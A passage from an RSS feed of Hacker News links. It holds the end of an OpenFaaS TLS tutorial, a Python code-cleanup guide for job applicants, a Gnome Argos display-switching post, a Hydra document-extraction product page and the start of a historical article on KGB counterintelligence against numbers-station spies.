<ul>
<li>For EKS create a DNS CNAME record for the DNS entry given</li>
<li>For all other cluster create a DNS A record with the IP given</li>
</ul>
<p>If you have the DigitalOcean CLI installed <a href="https://github.com/digitalocean/doctl">doctl</a> then you can run:</p>
<pre><code>export IP="" # populate from above
doctl compute domain create $DOMAIN --ip-address $IP
</code></pre>
<h3 id="waitalittle">Wait a little</h3>
<p>You now need to wait for your DNS entry to propagate and for cert-manager to obtain a certificate.</p>
<p>Check how things are going with:</p>
<pre><code>kubectl logs deploy/cert-manager -n cert-manager -f
</code></pre>
<h3 id="logintoopenfaaswithtls">Log-in to OpenFaaS with TLS</h3>
<pre><code>export OPENFAAS_URL=https://$DOMAIN

PASSWORD=$(kubectl get secret -n openfaas basic-auth -o jsonpath="{.data.basic-auth-password}" | base64 --decode; echo)

echo $PASSWORD | faas-cli login -s

faas-cli store deploy nodeinfo
faas-cli list -v

faas-cli invoke figlet
</code></pre>
<p>You can also open the OpenFaaS UI over an encrypted connection:</p>
<pre><code>echo Open a browser at https://$DOMAIN
</code></pre>
<p><img src="https://blog.alexellis.io/content/images/2019/10/Screenshot-2019-10-25-at-14.12.43.png" alt="Screenshot-2019-10-25-at-14.12.43"></p>
<h2 id="wrappingup">Wrapping up</h2>
<p>When I proposed that <code>arkade</code> should configure TLS for OpenFaaS in a single command, it was because I wanted to make the whole process less painful and repetitive, and to guard users from the many breaking changes we've seen in cert-manager over the course of the last 12 months.</p>
<p>I think I achieved that aim, but make up your own mind. Compare the following with the single line we typed in above:</p>
<ul>
<li>Full docs: <a href="https://docs.openfaas.com/reference/ssl/kubernetes-with-cert-manager/">Add TLS to OpenFaaS with cert-manager</a></li>
</ul>
<p>Interest in OpenFaaS and <code>arkade</code> is growing rapidly, so for me it's even more important that users have easy access to TLS certificates to encrypt their traffic.</p>
<p>If you'd like to see new "apps" (helm charts) supported in arkade, then let me know on the GitHub repository <a href="https://get-arkade.dev/">https://get-arkade.dev</a> and add your ⭐️ to show support.</p>
<p>Keep on learning:</p>
<ul>
<li><a href="https://github.com/openfaas/workshop">OpenFaaS hands-on workshop</a></li>
<li><a href="https://www.openfaas.com/blog/openfaas-oidc-okta/">Enable Single Sign-on (SSO) for OpenFaaS with Okta and OpenID Connect</a></li>
</ul>
<p>Connect with the <a href="https://slack.openfaas.io/">community on Slack</a></p>
</div>
        </section>

        

    </article>
</div></div>]]>
            </description>
            <link>https://blog.alexellis.io/tls-the-easy-way-with-openfaas-and-k3sup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541675</guid>
            <pubDate>Mon, 21 Sep 2020 10:18:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Python Code Cleanup for Beginners]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24541386">thread link</a>) | @imankulov
<br/>
September 21, 2020 | https://imankulov.name/posts/python-cleanup/ | <a href="https://web.archive.org/web/*/https://imankulov.name/posts/python-cleanup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        






<p><img src="https://imankulov.name/posts/python-cleanup/priorities_hu3b283fe0159607ee8664386d7eab28b3_134269_1000x700_fill_q75_box_smart1.jpg" width="1000" height="700" alt="Programmer Priorities">

<span>
    <small>
        Photo by <a href="https://twitter.com/LeaVerou/status/1306001020636540934">Lea Verou</a>
    </small>
</span></p><p>It’s my responsibility to hire Python developers. If you have a GitHub account, I will check it out. Everyone does it. Maybe you don’t know, but your playground project with zero stars can help you to get that job offer.</p>
<p>The same goes for your take-home test task. You heard this, when we meet a person for the first time, we make the first impression in 30 seconds, and this biases the rest of our judgment. I find it uncomfortably unfair that beautiful people get everything easier than the rest of us. The same bias applies to the code. You look at the project, and something immediately catches your eye. Leftovers of the old code in the repo, like leftovers of your breakfast in your beard, can ruin everything. You may not have a beard, but you get the point.</p>
<p>Usually, it’s easy to see when it’s a beginner’s code. Below, I provide some tricks to fool recruiters like me and increase your chances of passing to the next interview level. Don’t feel bad if you think like you’re gaming the system, because you are not. Applying these little improvements to your code not only increases your chances to succeed at the interview, but you also become a better developer. Which I can’t tell for drilling focusing on memorizing algorithms or modules of the standard library.</p>
<p>What’s the difference between a beginner and a more experienced developer? Beginners did not work with the legacy codebase, and they don’t see value in investing in a maintainable solution. Quite often, they work alone and equally, they don’t care much about the readability.</p>
<p><strong>Your goal is to show that you care about the readability and maintainability of your solution.</strong></p>
<p>Let’s see what we can do to improve the quality of your Python project. These tips make your code better, and if you don’t cargo-cult them, they also make you a better developer.</p>
<p><strong>1. Declutter the repo</strong><br>
Open your repo page on GitHub. Do you have <code>.idea</code>, <code>.vscode</code>, <code>.DS_Store</code> or <code>*.pyc</code> files? Have you committed your virtualenv there? Remove them now, and add files and directories to the gitignore. The rule of thumb is to avoid keeping in the codebase anything that you haven’t created yourself. There is a good <a href="https://www.atlassian.com/git/tutorials/saving-changes/gitignore">tutorial from Atlassian</a> to know more about gitignore and what to ignore in general.</p>
<details>
<summary>Example</summary>
<p><strong>✅ A minimal gitignore example for the Python project</strong><br>
A good starting point for the <code>.gitignore</code>. Add it to your repository in the first place.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span></code></pre></td>
<td>
<pre><code data-lang="fallback">*.pyc
*.egg-info

# If you're on Mac
.DS_Store

# If you have a habit of creating a virtual environment
# inside the project, as I do
/env

# Configuration and secrets (see an example in the next section)
/.env
</code></pre></td></tr></tbody></table>
</div>
</div><p>For a bigger gitignore, use <a href="https://github.com/github/gitignore/blob/master/Python.gitignore">the one from the GitHub’s collection</a> as a stargting point and a source of the inspiration.</p>
</details>
<p><strong>2. No passwords in the code</strong><br>
No passwords to the databases, API keys to external services, or secret keys for encryption in the repo! Move the secrets to configuration files or environment variables, or read them from the secret store, and never commit them to the codebase. The 12-factor guide is an excellent and always relevant read, and its advice about <a href="https://12factor.net/config">configs</a> is on-point.</p>
<details>
<summary>Example</summary>
<p><strong>🚫 Database requisites in the code</strong><br>
It’s a snippet from a Flask application where the author keeps the database requisites in the code.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td>
<td>
<pre><code data-lang="python"><span>from</span> <span>flask</span> <span>import</span> Flask

app <span>=</span> Flask(__name__)
app<span>.</span>config[<span>"SQLALCHEMY_DATABASE_URI"</span>] <span>=</span> <span>"postgresql://user:secret@localhost:5432/my_db"</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p><strong>✅ Database requisites in environment</strong><br>
Moving requisites to the environment is quite straightforward.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre><code data-lang="python"><span>import</span> <span>os</span>
<span>from</span> <span>flask</span> <span>import</span> Flask

app <span>=</span> Flask(__name__)
app<span>.</span>config[<span>"SQLALCHEMY_DATABASE_URI"</span>] <span>=</span> os<span>.</span>getenv(<span>"SQLALCHEMY_DATABASE_URI"</span>)
</code></pre></td></tr></tbody></table>
</div>
</div><p>Now, before starting the application, you need to initialize the environment.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span></code></pre></td>
<td>
<pre><code data-lang="bash"><span>export</span> <span>SQLALCHEMY_DATABASE_URI</span><span>=</span>postgresql://user:secret@localhost:5432/my_db
flask run
</code></pre></td></tr></tbody></table>
</div>
</div><p><strong>✅ Database requisites in the .env file</strong><br>
To avoid initializing the environment from your console, take a step further and include your requisites in a file <code>.env</code>. Install the package <a href="https://pypi.org/project/python-dotenv/">python-dotenv</a> and initialize your environment right from the Python code.</p>
<p>That’s how the <code>.env</code> would look like</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span></code></pre></td>
<td>
<pre><code data-lang="fallback">SQLALCHEMY_DATABASE_URI=postgresql://user:secret@localhost:5432/my_db
</code></pre></td></tr></tbody></table>
</div>
</div><p>Reading this file from your application looks like this:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td>
<td>
<pre><code data-lang="python"><span>import</span> <span>os</span>
<span>from</span> <span>dotenv</span> <span>import</span> load_dotenv
<span>from</span> <span>flask</span> <span>import</span> Flask

load_dotenv()

app <span>=</span> Flask(__name__)
app<span>.</span>config[<span>"SQLALCHEMY_DATABASE_URI"</span>] <span>=</span> os<span>.</span>getenv(<span>"SQLALCHEMY_DATABASE_URI"</span>)
</code></pre></td></tr></tbody></table>
</div>
</div><p>Don’t forget to add the path to your <code>.env</code> file to <code>.gitignore</code> so that you don’t commit it accidentally.</p>
</details>
<p><strong>3. Have a README</strong><br>
Have a top-level README with the purpose of your project, installation instructions, and the quick start guide. If you don’t know what to write there, follow the <a href="https://www.makeareadme.com/">Make a README</a> guideline.</p>
<details>
<summary>Example</summary>
<p><strong>✅ A sample README for a Python project</strong><br>
As suggested by the “Make a README” resource, include in the README installation and usage instructions. The example below also includes contributing guidelines and a license, which is crucial for an open-source project.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span><span>25
</span><span>26
</span><span>27
</span><span>28
</span><span>29
</span><span>30
</span><span>31
</span><span>32
</span><span>33
</span><span>34
</span><span>35
</span><span>36
</span></code></pre></td>
<td>
<pre><code data-lang="markdown"><span># Foobar
</span><span></span>
Foobar is a Python application for dealing with word pluralization.

<span>## Installation
</span><span></span>
Clone the repository from GitHub. Then create a virtual environment, and install all the dependencies.

<span>```bash
</span><span></span>git clone https://github.com/username/foobar.git
python3 -m venv env
<span>source</span> env/bin/activate
python -m pip install -r requirements.txt
<span>```</span>

<span>## Usage
</span><span></span>
Initialize the virtual environment, and run the script

<span>```bash
</span><span></span><span>source</span> env/bin/activate
./pluralize word
words
./pluralize goos
geese
<span>```</span>

<span>## Contributing
</span><span></span>
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update the tests as appropriate.

<span>## License
</span><span></span>
[<span>MIT</span>](<span>https://choosealicense.com/licenses/mit/</span>)
</code></pre></td></tr></tbody></table>
</div>
</div></details>
<p><strong>4. If you use third-party libraries, have a requirements.txt</strong><br>
If your project requires third-party dependencies, declare them explicitly. The simplest way is to create a requirements.txt file in the top-level directory, one dependency per line. Don’t forget to add an instruction to use requirements.txt to the README. Read more about the file in the <a href="https://pip.pypa.io/en/stable/user_guide/#requirements-files">pip user guide</a></p>
<details>
<summary>Example</summary>
<p><strong>✅ A sample requirements.txt for a Flask application</strong><br>
Adding requirements.txt to the root of your project is the simplest way of keeping track of project dependencies. Optionally, you can define the version constraints for them.</p>
<p><em>requirements.txt</em></p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td>
<td>
<pre><code data-lang="fallback">gunicorn
Flask&gt;=1.1
Flask-SQLAlchemy
psycopg2
</code></pre></td></tr></tbody></table>
</div>
</div><p><strong>✅ A more elaborated example with requirements.in</strong><br>
It’s always good to have a reproducible environment. Even if a new library comes out, you keep using the old battle-tested version until you explicitly decide to upgrade the version. It’s called “dependency pinning” and the easiest way to advance with it is to use <a href="https://pypi.org/project/pip-tools/">pip-tools</a>. There, you have two files: requirements.in and requirements.txt. You never modify the latter by hand, but you commit it along with requirements.in.</p>
<p>Here’s the source file <em>requirements.in</em>:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td>
<td>
<pre><code data-lang="fallback">gunicorn
Flask&gt;=1.1
Flask-SQLAlchemy
psycopg2
</code></pre></td></tr></tbody></table>
</div>
</div><p>To get <em>requirements.txt</em> you compile it by running a command <code>pip-compile</code></p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span></code></pre></td>
<td>
<pre><code data-lang="fallback">#
# This file is autogenerated by pip-compile
# To update, run:
#
#    pip-compile
#
click==7.1.2              # via flask
flask-sqlalchemy==2.4.4   # via -r requirements.in
flask==1.1.2              # via -r requirements.in, flask-sqlalchemy
gunicorn==20.0.4          # via -r requirements.in
itsdangerous==1.1.0       # via flask
jinja2==2.11.2            # via flask
markupsafe==1.1.1         # via jinja2
psycopg2==2.8.6           # via -r requirements.in
sqlalchemy==1.3.19        # via flask-sqlalchemy
werkzeug==1.0.1           # via flask

# The following packages are considered to be unsafe in a requirements file:
# setuptools
</code></pre></td></tr></tbody></table>
</div>
</div><p>As you can see, the resulted file contains the exact versions of all the dependencies.</p>
</details>
<p><strong>5. Format your code with black</strong><br>
Inconsistent formatting doesn’t prevent your code from working. Still, formatted code makes your code easier to read and to maintain. Fortunately, code formatting can and should be automated. If you use VSCode, it suggests installing “black”, an automatic source code formatter for Python, and reformats your code on save. Also, you can install <a href="https://black.readthedocs.io/en/stable/">black</a> and do the same from the console.</p>
<details>
<summary>Example</summary>
<p><strong>🚫 Unformatted code</strong><br>
The code is hard to read and to extend</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span></code></pre></td>
<td>
<pre><code data-lang="python"><span>def</span> <span>pluralize</span> ( word ):
    exceptions<span>=</span>{
<span>"goose"</span>:<span>'geese'</span>,<span>'phenomena'</span> : <span>'phenomenon'</span>   }
    <span>if</span> word <span>in</span> exceptions :
        <span>return</span> exceptions [ word ]
    <span>return</span> word<span>+</span><span>'s'</span>

<span>if</span> __name__<span>==</span><span>'__main__'</span> :
    <span>import</span> <span>sys</span>
    <span>print</span> ( pluralize ( sys<span>.</span>argv[<span>1</span>] ) )
</code></pre></td></tr></tbody></table>
</div>
</div><p><strong>✅ The same code, formatted with black</strong><br>
Black guarantees that the code keeps the same functionality. It only saves you from the mental burden of manually following the same formatting guideline.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span></code></pre></td>
<td>
<pre><code data-lang="python"><span>def</span> <span>pluralize</span>(word):
    exceptions <span>=</span> {<span>"goose"</span>: <span>"geese"</span>, <span>"phenomena"</span>: <span>"phenomenon"</span>}
    <span>if</span> word <span>in</span> exceptions:
        <span>return</span> exceptions[word]
    <span>return</span> word <span>+</span> <span>"s"</span>


<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    <span>import</span> <span>sys</span>

    <span>print</span>(pluralize(sys<span>.</span>argv[<span>1</span>]))
</code></pre></td></tr></tbody></table>
</div>
</div></details>
<p><strong>6. Remove unused imports</strong><br>
Unused imports are usually left hanging in the codebase after some experiments and refactoring. If you don’t use a module anymore, don’t forget to remove it from the file. Editors usually highlight unused imports, making them an easy target.</p>
<details>
<summary>Example</summary>
<p><strong>🚫 Unused imports</strong><br>
The import “os” is not used.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td>
<td>
<pre><code data-lang="python"><span>import</span> <span>os</span>

<span>print</span>(<span>"Hello world"</span>)
</code></pre></td></tr></tbody></table>
</div>
</div><p><strong>✅ No unused imports</strong><br>
Well, that is trivial.</p>
</details>
<p><strong>7. Remove unused variables</strong><br>
The same goes for unused variables. You may have them because you followed the flow and though that a variable will be useful later on, but it turned out to be never used in the first place.</p>
<details>
<summary>Example</summary>
<p><strong>🚫 Unused variables</strong><br>
The …</p></details></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://imankulov.name/posts/python-cleanup/">https://imankulov.name/posts/python-cleanup/</a></em></p>]]>
            </description>
            <link>https://imankulov.name/posts/python-cleanup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541386</guid>
            <pubDate>Mon, 21 Sep 2020 09:29:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Manage external displays with Gnome and Argos extension]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24541346">thread link</a>) | @e-Minguez
<br/>
September 21, 2020 | https://www.underkube.com/posts/2020-09-21-gnome-displays-argos/ | <a href="https://web.archive.org/web/*/https://www.underkube.com/posts/2020-09-21-gnome-displays-argos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="post-body"><p>I wanted to easily switch between my regular desktop configuration:
<img src="https://www.underkube.com/images/gnome-displays-argos/00-standard.jpg" alt="standard"></p><p>All the external displays:
<img src="https://www.underkube.com/images/gnome-displays-argos/01-externals.jpg" alt="externals"></p><p>To a single external display:
<img src="https://www.underkube.com/images/gnome-displays-argos/02-external-horizontal.jpg" alt="single-external"></p><p>Or just the laptop screen:
<img src="https://www.underkube.com/images/gnome-displays-argos/03-laptop.jpg" alt="laptop"></p><p>This usually required to open <code>gnome-control-center</code>, then click displays, etc.
<img src="https://www.underkube.com/images/gnome-displays-argos/gnome-control-center.png" alt="gnome-control-center"></p><p>So I thought it would be nice to look for a extension in the
<a href="https://extensions.gnome.org/">Gnome Extensions</a> site… but I couldn’t find
any that worked as I wanted… so let’s try to do our own method! :)</p><h2 id="argos">Argos</h2><p>Just in case you never heard of <a href="https://github.com/p-e-w/argos">Argos</a>, it is a
Gnome ‘metaextension’ where you can create your own extensions based on scripts,
commands, etc. It is inspired by, and fully compatible with, the
<a href="https://github.com/matryer/bitbar">BitBar</a> app for OSX.</p><p>In order to install it, you just need to go to its
<a href="https://extensions.gnome.org/extension/1176/argos/">the Gnome Extensions</a> page
and click on the “ON|OFF” button. Profit!</p><p>There are plenty of examples and useful argos/bitbar scripts out there so my
recomendation is to look for ‘prior art’ to inspire yourself on creating your
own extensions.</p><h2 id="xorg-or-wayland">Xorg or Wayland?</h2><p>I use Xorg instead of Wayland because I couldn’t find an alternative to
<code>xbindkeys</code> for Wayland to customize my
<a href="https://www.logitech.com/es-es/product/mx-master-2s-flow">MX Master 2S</a> mouse
keys. See
<a href="https://wiki.archlinux.org/index.php/Logitech_MX_Master#Xbindkeys">here</a> for
more information on how to do that, but basically, this is my <code>~/.xbindkeysrc</code>:</p><pre><code># thumb wheel up =&gt; increase volume
"xte 'key XF86AudioRaiseVolume'"
   b:8

# thumb wheel down =&gt; lower volume
"xte 'key XF86AudioLowerVolume'"
   b:9
</code></pre><h2 id="enter-xrandr-and-arandr">Enter xrandr and arandr</h2><p>tl;dr.- <a href="https://wiki.archlinux.org/index.php/Xrandr"><code>xrandr</code></a> is a cli tool to
manage displays using xorg while
<a href="https://christian.amsuess.com/tools/arandr/">arandr</a> is a nice GUI tool to
create <code>xrandr</code> “scripts” easily:</p><p><img src="https://www.underkube.com/images/gnome-displays-argos/arandr.png" alt="arandr screenshot"></p><p>Basically it generates <code>sh</code> scripts such as <code>~/.screenlayout/00-standard.sh</code>:</p><pre><code>#!/bin/sh
xrandr --output eDP-1 --mode 1920x1080 --pos 3000x420 --rotate normal --output DP-1 --off --output HDMI-1 --off --output DP-2 --off --output HDMI-2 --off --output DP-1-1 --primary --mode 1920x1080 --pos 0x420 --rotate normal --output DP-1-2 --mode 1920x1080 --pos 1920x0 --rotate left --output DP-1-3 --off
</code></pre><p>So I have a script for each of my setups:</p><pre><code>$ ls -1 ~/.screenlayout/
00-standard.sh
01-single-external.sh
02-only-external.sh
03-laptop.sh
04-vertical.sh
</code></pre><h2 id="argos-extension">Argos extension</h2><p>With everything in place, the argos extension is just this
<code>~/.config/argos/external_monitor.1r..sh</code> script:</p><pre><code>#!/usr/bin/env bash

echo "|iconName=video-display"
echo "---"

for i in $(find ~/.screenlayout/*.sh)
do
  # https://stackoverflow.com/questions/2664740/extract-file-basename-without-path-and-extension-in-bash
  file="${i##*/}"
  echo "${file%.*} | bash='${i}' terminal=false"
done
</code></pre><p>Which looks like:</p><p><img src="https://www.underkube.com/images/gnome-displays-argos/argos-screenshot.png" alt="argos screenshot"></p><p>Nice!!!</p></section></div>]]>
            </description>
            <link>https://www.underkube.com/posts/2020-09-21-gnome-displays-argos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541346</guid>
            <pubDate>Mon, 21 Sep 2020 09:19:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Hydra – Robust documents-to-database automation service]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24541208">thread link</a>) | @siftrics
<br/>
September 21, 2020 | https://siftrics.com/hydra.html | <a href="https://web.archive.org/web/*/https://siftrics.com/hydra.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div id="titleWrapper"><p>HYDRA</p><p>a documents-to-database automation service.</p></div><div><p><a href="https://siftrics.com/bbs.png"><img alt="image of original invoice" src="https://siftrics.com/bbs.png"></a></p><div><p>A user needs to process 1,000 invoices. They give Hydra one example document, drawing &amp; labeling bounding boxes around desired text.</p><p>The remaining invoices are sent via <a href="https://github.com/siftrics/hydra#command-line-quickstart">CLI</a> or <a href="https://siftrics.com/docs/hydra.html">POST request</a>. Extracted text is returned as JSON.</p><p>Hydra intelligently handles...</p><p>--- tables w/ a variable number of rows</p><p>--- dynamically positioned text</p><p>--- skewed, rotated, and offset documents</p><p>Not a believer? Scroll down to see Hydra in action, or <a href="https://siftrics.com/create.html">sign up and try out your own documents</a>. First 1,000 pages are on us.</p><p><a href="https://siftrics.com/docs/hydra.html">Official documentation</a>.</p></div></div><div><p><a href="https://siftrics.com/helm_sideways-0.png"><img alt="image of original invoice" src="https://siftrics.com/helm_sideways-0.png"></a></p><div><p>This document was physically cut in half and scanned in sideways.</p><p>There are only 2 rows in the table (there were 3 rows in the original document).</p><p>The position of "Total Amount Owed" has shifted on document.</p><p>JSON returned from Hydra:</p><div><pre>"RecognizedText": {
  "Address": "456 Viking Lane\nOslo, MN 23456",
  "Customer": "Nordic Airways, Inc.",
  "Date Issued": "2019/12/19",
  "Expiry Date": "2020/01/19",
  "Purchased Items": [
    {
      "Item": "In-flight entertainment system",
      "Price": "$500",
      "Quantity": "500",
      "Total": "$250,000"
    },
    {
      "Item": "Cockpit Displays",
      "Price": "$2,000",
      "Quantity": "20",
      "Total": "$40,000"
    }
  ],
  "Total Amount Owed": "$290,000"
}</pre></div></div><p><a href="https://siftrics.com/helm_upside-down-3.png"><img alt="image of original invoice" src="https://siftrics.com/helm_upside-down-3.png"></a></p><div><p>This document was scanned in upside-down and suffers similar ailments to the previous.</p><p>JSON returned from Hydra:</p><div><pre>"RecognizedText": {
  "Address": "1600 Ampitheatre Parkway\nMountain View, CA 94043",
  "Customer": "Google, LLC.",
  "Date Issued": "2020/05/25",
  "Expiry Date": "2020/10/31",
  "Purchased Items": [
    {
      "Item": "Superbots",
      "Price": "$1,000",
      "Quantity": "1000",
      "Total": "$1,000,000"
    },
    {
      "Item": "Flight Engineers",
      "Price": "$300,000",
      "Quantity": "20",
      "Total": "$6,000,000"
    },
    {
      "Item": "Stickers",
      "Price": "$0.20",
      "Quantity": "500",
      "Total": "$100"
    },
    {
      "Item": "T-shirts",
      "Price": "$15",
      "Quantity": "20",
      "Total": "$300"
    }
  ],
  "Total Amount Owed": "$7,000,400"
}</pre></div></div></div></div></div>]]>
            </description>
            <link>https://siftrics.com/hydra.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541208</guid>
            <pubDate>Mon, 21 Sep 2020 08:57:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to catch a spy that is using a numbers station – The KGB Experience]]>
            </title>
            <description>
<![CDATA[
Score 141 | Comments 68 (<a href="https://news.ycombinator.com/item?id=24541163">thread link</a>) | @Shaddox
<br/>
September 21, 2020 | https://www.numbers-stations.com/how-to-catch-a-spy-who-uses-numbers-stations-the-kgb-experience/ | <a href="https://web.archive.org/web/*/https://www.numbers-stations.com/how-to-catch-a-spy-who-uses-numbers-stations-the-kgb-experience/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div id="attachment_166048"><p><a href="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135547-scaled.jpg?ssl=1"><img aria-describedby="caption-attachment-166048" src="https://i2.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135547.jpg?resize=183%2C300&amp;ssl=1" alt="" width="183" height="300" srcset="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135547-scaled.jpg?resize=183%2C300&amp;ssl=1 183w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135547-scaled.jpg?resize=624%2C1024&amp;ssl=1 624w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135547-scaled.jpg?resize=768%2C1261&amp;ssl=1 768w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135547-scaled.jpg?resize=935%2C1536&amp;ssl=1 935w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135547-scaled.jpg?resize=1247%2C2048&amp;ssl=1 1247w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135547-scaled.jpg?w=1559&amp;ssl=1 1559w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135547-scaled.jpg?w=1500&amp;ssl=1 1500w" sizes="(max-width: 183px) 100vw, 183px" data-recalc-dims="1"></a></p><p id="caption-attachment-166048">Cover of the KGB manual. Mobile screen grab from Latvian national archive</p></div>


<p>From 2019 onwards the Latvian National Archive offers access to various KGB documents. The author had already previously shown the very detailed efforts of the Latvian KGB counterintelligence to monitor and study the CIA and BND numbers stations broadcasts, or what they called – “one directional communications”.<a href="#_ftn1" name="_ftnref1"><sup>[1]</sup></a> These are one of the most definitive archival sources which prove that foreign intelligence actively used shortwave in the USSR and that the KGB was aware of it. The documents showed that the KGB had monitored these broadcasts from at least 1978, but the files spoke very vaguely if the monitoring effort led to any apprehension and capture of a foreign agent. We, however, know that there were such cases like Alexander Ogorodnik<a href="#_ftn2" name="_ftnref2"><sup>[2]</sup></a>, and others where the use of shortwave signals was determined.</p>
<p>The Latvian National Archive digitized operational cases and also special KGB training manuals. These manuals were published for inner agency use and were never issued in public because they contained secret information. One such manual called “<em>Некоторые вопросы организаций работы по сигналам и делам оперативного учета лиц причастий в шпионажу”</em> published in 1985 by KGB of F. E Dzherzhinsky in Moscow.<a href="#_ftn3" name="_ftnref3"><sup>[3]</sup></a> (A few issues on organizing work on signals and cases recognizing persons taking part in espionage”). The manual was credited to major general A. A Fabrichinikov and colonel V.V Holopov The word “signal” in the title does not mean just a radio signal. In the KGB terminology “signal” meant a sign or report of a foreign intelligence or anti Soviet activity. If this “signal” indicated that the person is taking part in espionage he had to be investigated and evidence to be collected. The manual showed various historical cases as examples on how to apprehend and capture a foreign agent.</p>



<p>One such case was called” Case on Filatov”. Starting from page 41 the manual examples this case as one of the cases where radio communication was used between the agency and agent and how it was uncovered by counter intelligence. <strong>Anatoly N. Filatov</strong> was according to a 1981 Washington Post report sentenced in 1978 to be shot by a firing squad, though the sentence was commuted later to 15 years in prison.<a href="#_ftn4" name="_ftnref4"><sup>[4]</sup></a> A New York Times article in 1980 had rumored that A. Filatov was the same “Trigon” who is now commonly known as Alexandr Ogorodnik. The article states that A. Filatov was suspected of being discovered by the KGB counterintelligence and forced to send the CIA false information. The reasoning behind this hypothesis was that in 1977 “Trigon” went dark at the same time as A. Filatov sent a very questionable cable about Secretary of State Henry Kissinger, where he questioned the “bargaining position of president Carter” during the 1977 missile control talks.<a href="#_ftn5" name="_ftnref5"><sup>[5]</sup></a> Alexander Ogorodnik aka “Trigon” died on June 22 1977 after swallowing cyanide pills during a KGB break in.<a href="#_ftn6" name="_ftnref6"><sup>[6]</sup></a></p>
<p>David E. Hoffman, author of the book “The Million Dollar Spy” states that Filatov was arrested during a “car toss”, where a package is quickly swapped between two passing cars.<a href="#_ftn7" name="_ftnref7"><sup>[7]</sup></a> Russian author Aleksandr Kolpakidi in his book “The GRU Empire” writes that Filatov was born in 1940 in the Saratov district, joined the GRU in 1973. (GRU – the Main Intelligence Directorate – Soviet military intelligence agency) and served in Algiers where in 1974 he established contact with the CIA. Filatov had stated that his involvement with the adversary CIA happened as a result of being lured into a honey trap with a woman called Nadia, as similar happened to&nbsp; A. Ogorodnik. Either so or A. Filatov himself decided to become a double agent and started meeting CIA agent Edward Kane. In 1976 A. Filatov was called back to Moscow and the CIA had instructed him to receive shortwave coded broadcasts in German numbers from Frankfurt near Main, the broadcasts were to be carried out twice a week. Operative broadcast would be started with uneven numbers and training with even numbers. The broadcasts on precaution were carried out before A. Filatov returned to Moscow. The return message was to be carried out in a dead drop in an area near Dinamo sports stadium.</p>
